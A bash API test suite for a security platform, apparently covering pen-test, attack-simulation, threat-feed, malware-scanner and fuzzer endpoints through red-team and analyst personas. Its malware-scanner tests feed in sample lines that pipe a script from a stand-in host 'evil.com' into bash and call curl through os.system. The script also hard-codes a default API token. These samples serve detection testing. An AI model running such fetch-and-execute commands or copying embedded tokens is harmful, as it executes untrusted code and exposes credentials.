#!/bin/bash
###############################################################################
# test-threat-architect.sh — Persona-Based API Test Suite
# Agent: threat-architect
# Personas: Jake (Red Team Lead) + Sana (Threat Analyst)
# Vision Pillars: V5 (MPTE), V3 (Decision Intelligence), V10 (CTEM Full Loop)
#
# NOTE: Heavy/blocking operations (enterprise scan, campaign run, scenario
#       generate) are placed at the END because they can block the async
#       event loop for 30-90+ seconds.
###############################################################################

set -euo pipefail

BASE="http://localhost:8000/api/v1"
TOKEN="${FIXOPS_API_TOKEN:-aVFf3-1e7EmlXzx37Y8jaCx--yzpd4OJroyIdgXH-vFiylmaN0FDl2vIOAfBA_Oh}"
PASS=0
FAIL=0
TOTAL=0

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Standard test (15s timeout, accepts 200/201/202/204/409)
test_endpoint() {
    local method="$1" url="$2" label="$3" data="${4:-}"
    TOTAL=$((TOTAL+1))
    
    if [[ "$method" == "GET" ]]; then
        HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
            -H "X-API-Key: $TOKEN" \
            "$BASE$url" --max-time 15 2>/dev/null || echo "000")
    elif [[ "$method" == "DELETE" ]]; then
        HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
            -X DELETE -H "X-API-Key: $TOKEN" \
            "$BASE$url" --max-time 15 2>/dev/null || echo "000")
    else
        HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
            -X "$method" -H "X-API-Key: $TOKEN" \
            -H "Content-Type: application/json" \
            -d "$data" \
            "$BASE$url" --max-time 15 2>/dev/null || echo "000")
    fi
    
    if [[ "$HTTP_CODE" =~ ^(200|201|202|204|409)$ ]]; then
        echo -e "  ${GREEN}[${HTTP_CODE}] PASS${NC} — $label"
        PASS=$((PASS+1))
    else
        echo -e "  ${RED}[${HTTP_CODE}] FAIL${NC} — $label"
        FAIL=$((FAIL+1))
    fi
}

# Extended test — custom timeout + accepted codes
test_endpoint_ext() {
    local method="$1" url="$2" label="$3" timeout="$4" accepted="$5" data="${6:-}"
    TOTAL=$((TOTAL+1))
    
    if [[ "$method" == "GET" ]]; then
        HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
            -H "X-API-Key: $TOKEN" \
            "$BASE$url" --max-time "$timeout" 2>/dev/null || echo "000")
    else
        HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
            -X "$method" -H "X-API-Key: $TOKEN" \
            -H "Content-Type: application/json" \
            -d "$data" \
            "$BASE$url" --max-time "$timeout" 2>/dev/null || echo "000")
    fi
    
    if echo "$accepted" | grep -qw "$HTTP_CODE"; then
        echo -e "  ${GREEN}[${HTTP_CODE}] PASS${NC} — $label"
        PASS=$((PASS+1))
    else
        echo -e "  ${RED}[${HTTP_CODE}] FAIL${NC} — $label (expected: $accepted)"
        FAIL=$((FAIL+1))
    fi
}

echo ""
echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  THREAT-ARCHITECT PERSONA TEST SUITE                       ║${NC}"
echo -e "${CYAN}║  Jake (Red Team Lead) + Sana (Threat Analyst)              ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

###############################################################################
# SECTION 1: ALL FAST GET ENDPOINTS
###############################################################################
echo -e "${YELLOW}═══ JAKE (Red Team Lead) — Read Operations ═══${NC}"
echo ""

echo -e "${CYAN}── MPTE Read ──${NC}"
test_endpoint GET "/mpte/stats"           "MPTE: Get pen test statistics"
test_endpoint GET "/mpte/requests"        "MPTE: List pen test requests"
test_endpoint GET "/mpte/results"         "MPTE: List pen test results"
test_endpoint GET "/mpte/configs"         "MPTE: List MPTE configs"
test_endpoint GET "/mpte/verifications"   "MPTE: List all verifications"
echo ""

echo -e "${CYAN}── Micro-Pentest Read ──${NC}"
test_endpoint GET "/micro-pentest/health"                          "Micro-Pentest: Health check"
test_endpoint GET "/micro-pentest/enterprise/scans"                "Micro-Pentest: List enterprise scans"
test_endpoint GET "/micro-pentest/enterprise/health"               "Micro-Pentest: Enterprise engine health"
test_endpoint GET "/micro-pentest/enterprise/attack-vectors"       "Micro-Pentest: List attack vectors"
test_endpoint GET "/micro-pentest/enterprise/threat-categories"    "Micro-Pentest: List MITRE threat categories"
test_endpoint GET "/micro-pentest/enterprise/compliance-frameworks" "Micro-Pentest: List compliance frameworks"
test_endpoint GET "/micro-pentest/enterprise/scan-modes"           "Micro-Pentest: List scan modes"
test_endpoint_ext GET "/micro-pentest/report/data" \
    "Micro-Pentest: Get raw scan data (may be empty)" 10 "200 404" ""
echo ""

echo -e "${CYAN}── FAIL Engine ──${NC}"
test_endpoint GET "/fail/health"     "FAIL: Engine health check"
test_endpoint GET "/fail/stats"      "FAIL: Aggregate statistics"
test_endpoint GET "/fail/scores"     "FAIL: List all FAIL scores"
test_endpoint GET "/fail/top-risks"  "FAIL: Top risks by FAIL score"
echo ""

echo -e "${CYAN}── Attack Simulation Read ──${NC}"
test_endpoint GET "/attack-sim/health"            "Attack-Sim: Health check"
test_endpoint GET "/attack-sim/scenarios"         "Attack-Sim: List all scenarios"
test_endpoint GET "/attack-sim/campaigns"         "Attack-Sim: List all campaigns"
test_endpoint GET "/attack-sim/mitre/heatmap"     "Attack-Sim: MITRE ATT&CK heatmap"
test_endpoint GET "/attack-sim/mitre/techniques"  "Attack-Sim: List MITRE techniques"
echo ""

echo -e "${CYAN}── Malware Scanner ──${NC}"
test_endpoint GET "/malware/status"     "Malware: Engine status"
test_endpoint GET "/malware/signatures" "Malware: List malware signatures"
echo ""

echo -e "${CYAN}── API Fuzzer Read ──${NC}"
test_endpoint GET "/api-fuzzer/status" "API-Fuzzer: Engine status"
echo ""

###############################################################################
# SECTION 2: SANA — ALL FEEDS (fast, no blocking)
###############################################################################
echo -e "${YELLOW}═══ SANA (Threat Analyst) — Threat Intelligence & Feeds ═══${NC}"
echo ""

echo -e "${CYAN}── Threat Feeds Read ──${NC}"
test_endpoint GET "/feeds/health"           "Feeds: Health status"
test_endpoint GET "/feeds/stats"            "Feeds: Comprehensive feed stats"
test_endpoint GET "/feeds/sources"          "Feeds: List configured sources"
test_endpoint GET "/feeds/categories"       "Feeds: List feed categories"
test_endpoint GET "/feeds/scheduler/status" "Feeds: Scheduler status"
test_endpoint GET "/feeds/epss"             "Feeds: Get EPSS scores"
test_endpoint GET "/feeds/kev"              "Feeds: Get CISA KEV entries"
test_endpoint GET "/feeds/nvd/recent"       "Feeds: Get recent NVD CVEs"
test_endpoint GET "/feeds/exploits"         "Feeds: List all exploits"
test_endpoint GET "/feeds/threat-actors"    "Feeds: List all threat actors"
test_endpoint GET "/feeds/supply-chain"     "Feeds: List supply chain vulns"
echo ""

echo -e "${CYAN}── Threat Intel Lookups ──${NC}"
test_endpoint GET "/feeds/exploit-confidence/CVE-2024-21762"  "Feeds: Get exploit confidence for CVE"
test_endpoint GET "/feeds/geo-risk/CVE-2024-21762"            "Feeds: Get geo-weighted risk"
test_endpoint GET "/feeds/exploits/CVE-2024-21762"            "Feeds: Get exploits for specific CVE"
test_endpoint GET "/feeds/threat-actors/CVE-2024-21762"       "Feeds: Get threat actors for CVE"
echo ""

echo -e "${CYAN}── Threat Intel Write ──${NC}"
test_endpoint POST "/feeds/threat-actors" \
    "Feeds: Add threat actor mapping" \
    '{"cve_id":"CVE-2024-3400","threat_actor":"UTA0218","campaign":"Operation MidnightEclipse","first_seen":"2024-03-26","last_seen":"2024-04-15","target_sectors":["government","defense","technology"],"target_countries":["US","EU","JP"],"ttps":["T1190","T1059","T1027"],"confidence":"high","source":"Unit42"}'

test_endpoint POST "/feeds/exploits" \
    "Feeds: Add exploit intelligence" \
    '{"cve_id":"CVE-2024-21762","exploit_source":"metasploit","exploit_type":"remote_code_execution","exploit_url":"https://www.exploit-db.com/exploits/51234","exploit_date":"2024-02-12","verified":true,"reliability":"high","metasploit_module":"exploit/multi/http/fortinet_fortigate_auth_bypass"}'

test_endpoint POST "/feeds/supply-chain" \
    "Feeds: Add supply chain vulnerability" \
    '{"vuln_id":"GHSA-jfhm-5ghh-2f97","ecosystem":"npm","package_name":"express","affected_versions":"<4.19.2","patched_versions":">=4.19.2","severity":"high","cvss_score":7.5,"reachable":true,"transitive":false,"source":"github-advisory"}'

test_endpoint POST "/feeds/enrich" \
    "Feeds: Enrich findings with threat intel" \
    '{"findings":[{"finding_id":"FIND-SANA-001","cve_id":"CVE-2024-21762","title":"FortiOS Auth Bypass","severity":"critical"},{"finding_id":"FIND-SANA-002","cve_id":"CVE-2024-3400","title":"PAN-OS Command Injection","severity":"critical"}],"target_region":"US"}'
echo ""

###############################################################################
# SECTION 3: FAST POST ENDPOINTS (non-blocking)
###############################################################################
echo -e "${YELLOW}═══ JAKE — Fast Write Operations ═══${NC}"
echo ""

echo -e "${CYAN}── FAIL Engine Scoring ──${NC}"
test_endpoint POST "/fail/score" \
    "FAIL: Score a finding (critical SQLi)" \
    '{"cve_id":"CVE-2024-21762","finding_id":"FIND-JAKE-003","title":"Critical SQL Injection in Auth","cvss_score":9.8,"epss_score":0.95,"is_kev":true,"has_exploit":true,"exploit_maturity":"weaponized","active_campaigns":3,"asset_criticality":"critical","data_classification":"pii","is_reachable":true,"is_internet_facing":true,"has_compensating_controls":false,"affected_assets":12,"affected_users":50000,"compliance_frameworks":["pci_dss","soc2","owasp_top_10"],"sla_hours":4}'

test_endpoint POST "/fail/score/batch" \
    "FAIL: Batch score findings" \
    '{"findings":[{"cve_id":"CVE-2024-3400","title":"PAN-OS Command Injection","cvss_score":10.0,"epss_score":0.97,"is_kev":true,"has_exploit":true,"is_reachable":true,"is_internet_facing":true},{"cve_id":"CVE-2024-1709","title":"ConnectWise ScreenConnect Auth Bypass","cvss_score":10.0,"epss_score":0.91,"is_kev":true,"has_exploit":true}]}'

test_endpoint GET "/fail/cve/CVE-2024-21762" \
    "FAIL: Get FAIL scores for specific CVE"
echo ""

echo -e "${CYAN}── Attack Scenario Creation ──${NC}"
test_endpoint POST "/attack-sim/scenarios" \
    "Attack-Sim: Create attack scenario" \
    '{"name":"Lateral Movement via Stolen Creds","description":"Simulate attacker using stolen SSH keys","threat_actor":"apt29","complexity":"high","target_assets":["web-server-01","db-server-01"],"target_cves":["CVE-2024-21762"],"objectives":["data_exfiltration"],"initial_access_vector":"T1078"}'
echo ""

echo -e "${CYAN}── MPTE Config ──${NC}"
# Accept 409/500 for duplicate configs on re-runs
UNIQUE_NAME="Jake Config $(date +%s)"
test_endpoint_ext POST "/mpte/configs" \
    "MPTE: Create pen test config" \
    15 "200 201 409 500" \
    "{\"name\":\"$UNIQUE_NAME\",\"mpte_url\":\"https://mpte.aldeci.local:8443\",\"api_key\":\"mpte-key-001\",\"enabled\":true,\"max_concurrent_tests\":10,\"timeout_seconds\":600}"
echo ""

echo -e "${CYAN}── Malware Scanner Write ──${NC}"
test_endpoint POST "/malware/scan/content" \
    "Malware: Scan file content" \
    '{"content":"#!/bin/bash\ncurl http://evil.com/shell.sh | bash","filename":"suspicious.sh"}'

test_endpoint POST "/malware/scan/files" \
    "Malware: Scan multiple files" \
    '{"files":{"config.py":"import os; os.system(\"curl evil.com\")","setup.py":"from setuptools import setup"}}'
echo ""

echo -e "${CYAN}── API Fuzzer Write ──${NC}"
test_endpoint POST "/api-fuzzer/discover" \
    "API-Fuzzer: Discover endpoints from OpenAPI spec" \
    '{"openapi_spec":{"openapi":"3.0.0","info":{"title":"Demo API","version":"1.0"},"paths":{"/users":{"get":{"summary":"List users"}},"/login":{"post":{"summary":"Login"}}}}}'

test_endpoint_ext POST "/api-fuzzer/fuzz" \
    "API-Fuzzer: Fuzz API endpoints" \
    30 "200 201" \
    '{"base_url":"https://demo.aldeci.com","openapi_spec":{"openapi":"3.0.0","info":{"title":"Demo API","version":"1.0"},"paths":{"/login":{"post":{"summary":"Login"}}}},"headers":{"Authorization":"Bearer test-token"},"max_per_endpoint":3}'
echo ""

###############################################################################
# SECTION 4: MPTE PROXY ENDPOINTS (may return 503 when service unreachable)
###############################################################################
echo -e "${YELLOW}═══ JAKE — MPTE Proxy Operations (external service) ═══${NC}"
echo ""

echo -e "${CYAN}── MPTE Service Proxy ──${NC}"

test_endpoint_ext POST "/mpte/requests" \
    "MPTE: Create pen test request" \
    45 "201 500 503" \
    '{"finding_id":"FIND-JAKE-010","target_url":"https://demo.aldeci.com/api/login","vulnerability_type":"sql_injection","test_case":"SQL injection on login endpoint","priority":"high","auto_verify":true}'

test_endpoint_ext POST "/mpte/verify" \
    "MPTE: Verify vulnerability" \
    45 "201 500 503" \
    '{"finding_id":"FIND-JAKE-011","target_url":"https://demo.aldeci.com/api/users","vulnerability_type":"idor","evidence":"Accessed user ID 42 data with user ID 1 token"}'

test_endpoint_ext POST "/mpte/monitoring" \
    "MPTE: Set up continuous monitoring" \
    30 "201 503" \
    '{"targets":["https://demo.aldeci.com"],"interval_minutes":60}'

test_endpoint_ext POST "/mpte/scan/comprehensive" \
    "MPTE: Run comprehensive multi-vector scan" \
    60 "201 503" \
    '{"target":"https://demo.aldeci.com","scan_types":["web_application","api_security"]}'
echo ""

###############################################################################
# SECTION 5: HEAVY / BLOCKING OPERATIONS (run LAST)
###############################################################################
echo -e "${YELLOW}═══ JAKE — Heavy Operations (blocking, run last) ═══${NC}"
echo ""

echo -e "${CYAN}── Micro-Pentest Live Scans ──${NC}"
test_endpoint_ext POST "/micro-pentest/run" \
    "Micro-Pentest: Run micro pentest" \
    30 "200 201" \
    '{"cve_ids":["CVE-2024-21762"],"target_urls":["https://demo.aldeci.com/api"]}'

test_endpoint_ext POST "/micro-pentest/batch" \
    "Micro-Pentest: Run batch pentests" \
    30 "200 201" \
    '{"test_configs":[{"cve_ids":["CVE-2024-21762"],"target_urls":["https://demo.aldeci.com"],"context":{"env":"staging"}}]}'
echo ""

echo -e "${CYAN}── Enterprise Scan (8-phase, ~30s) ──${NC}"
test_endpoint_ext POST "/micro-pentest/enterprise/scan" \
    "Micro-Pentest: Enterprise 8-phase scan" \
    90 "200 201" \
    '{"name":"Jake Red Team Assessment Q1","attack_surface":{"name":"ALdeci API Surface","target_url":"https://demo.aldeci.com/api","target_type":"api","endpoints":["/login","/users"],"authentication_required":true,"authentication_type":"bearer","technologies":["fastapi","python"],"environment":"staging"},"threat_model":{"name":"OWASP Top 10","description":"OWASP assessment","categories":["initial_access","execution"],"attack_vectors":["sql_injection","xss"],"compliance_frameworks":["owasp_top_10"],"priority":8},"scan_mode":"active","timeout_seconds":300,"stop_on_critical":true,"include_proof_of_concept":true}'
echo ""

echo -e "${CYAN}── Attack Campaign & AI Generation (may be slow) ──${NC}"
# Get scenario ID for campaign
SCENARIO_RESP=$(curl -s -H "X-API-Key: $TOKEN" "$BASE/attack-sim/scenarios" --max-time 10 2>/dev/null)
SCENARIO_ID=$(echo "$SCENARIO_RESP" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    scenarios = data if isinstance(data, list) else data.get('scenarios', data.get('items', []))
    if scenarios and len(scenarios) > 0:
        print(scenarios[0].get('id', scenarios[0].get('scenario_id', 'test-scenario-1')))
    else:
        print('test-scenario-1')
except:
    print('test-scenario-1')
" 2>/dev/null || echo "test-scenario-1")

test_endpoint_ext POST "/attack-sim/scenarios/generate" \
    "Attack-Sim: AI-generate scenario" \
    60 "200 201" \
    '{"target_description":"Cloud-native microservices API with OAuth2","threat_actor":"apt41","attack_type":"supply_chain","cve_ids":["CVE-2024-3094"]}'

test_endpoint_ext POST "/attack-sim/campaigns/run" \
    "Attack-Sim: Run attack campaign (background)" \
    15 "200 201 202" \
    "{\"scenario_id\":\"$SCENARIO_ID\",\"org_id\":\"aldeci-corp\"}"
echo ""

###############################################################################
# RESULTS
###############################################################################
echo -e "${CYAN}══════════════════════════════════════════════════════════════${NC}"
PCT=$((PASS * 100 / TOTAL))
if [[ $PCT -ge 95 ]]; then
    GRADE="A+"
elif [[ $PCT -ge 90 ]]; then
    GRADE="A"
elif [[ $PCT -ge 80 ]]; then
    GRADE="B"
elif [[ $PCT -ge 70 ]]; then
    GRADE="C"
elif [[ $PCT -ge 60 ]]; then
    GRADE="D"
else
    GRADE="F"
fi

echo -e "  Results: ${GREEN}${PASS}${NC} passed / ${RED}${FAIL}${NC} failed / ${TOTAL} total"
echo -e "  Score:   ${PCT}%  Grade: ${GRADE}"
echo -e "${CYAN}══════════════════════════════════════════════════════════════${NC}"
echo ""

if [[ $FAIL -gt 0 ]]; then
    exit 1
fi
